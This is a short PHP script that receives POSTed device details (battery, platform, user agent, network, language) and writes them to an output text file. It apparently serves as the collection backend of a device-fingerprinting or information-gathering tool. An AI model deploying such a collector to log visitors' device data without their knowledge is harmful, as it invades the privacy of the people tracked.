<?php
// Copyright© 2020 By FajarTheGGman

$d = $_POST['batre'];
$x = $_POST['device'];
$z = $_POST['platform'];
$a = $_POST['agent'];
$f = $_POST['facecam'];
$v = $_POST['vendor'];
$s = $_POST['sub'];
$n = $_POST['network'];
$l = $_POST['language'];

// delete file device.txt
if(file_exists("../../output/device.txt")){
    unlink("../../output/device.txt");
}

// add device.txt for device information
file_put_contents("../../output/device.txt", " "  .$d.$x.$z.$a.$s.$n.$l.  "\n", FILE_APPEND);

?>